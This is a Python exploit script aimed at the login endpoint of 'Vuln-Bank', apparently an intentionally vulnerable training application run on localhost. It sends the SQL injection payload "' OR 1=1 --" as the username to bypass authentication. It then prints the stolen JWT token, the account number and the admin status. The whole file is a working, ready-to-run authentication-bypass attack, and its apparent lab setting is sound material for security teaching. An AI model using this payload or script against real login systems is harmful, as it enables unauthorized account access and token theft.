#!/usr/bin/env python3
"""
SQL Injection Exploit for Vuln-Bank Login

This script demonstrates the SQL injection vulnerability in the login functionality
of the Vuln-Bank application. It bypasses authentication by injecting SQL code
that makes the WHERE clause always evaluate to true.

Usage:
    python3 exploit.py [target_url]

Example:
    python3 exploit.py http://localhost:5000
"""

import requests
import json
import sys
import argparse

def exploit_sql_injection(base_url):
    """
    Exploits SQL injection vulnerability in the login endpoint
    
    Args:
        base_url: The base URL of the vulnerable application
        
    Returns:
        dict: The JSON response containing the authentication token and user info
    """
    print("[*] Attempting SQL injection on login endpoint...")
    
    # Craft the payload with SQL injection
    payload = {
        "username": "' OR 1=1 --",
        "password": "anything"  # Password doesn't matter due to comment in SQL query
    }
    
    # Send the request to the login endpoint
    login_url = f"{base_url}/login"
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(login_url, headers=headers, json=payload)
        
        if response.status_code == 200:
            data = response.json()
            print("[+] SQL injection successful!")
            print(f"[+] Logged in as: {data.get('debug_info', {}).get('username', 'Unknown')}")
            print(f"[+] Account Number: {data.get('accountNumber', 'Unknown')}")
            print(f"[+] Admin Access: {data.get('isAdmin', False)}")
            print(f"[+] JWT Token: {data.get('token', 'None')}")
            return data
        else:
            print(f"[-] Failed to exploit SQL injection. Status code: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return None
    except Exception as e:
        print(f"[-] Error during exploitation: {str(e)}")
        return None

def main():
    parser = argparse.ArgumentParser(description="Exploit SQL injection in Vuln-Bank login")
    parser.add_argument("url", nargs="?", default="http://localhost:5000", 
                        help="Base URL of the vulnerable application (default: http://localhost:5000)")
    args = parser.parse_args()
    
    print("=== Vuln-Bank SQL Injection Exploit ===")
    print(f"[*] Target: {args.url}")
    
    result = exploit_sql_injection(args.url)
    
    if result:
        print("\n[+] Exploitation successful! You now have access to the application.")
        print("[*] You can use the JWT token to make authenticated requests.")
    else:
        print("\n[-] Exploitation failed.")

if __name__ == "__main__":
    main()
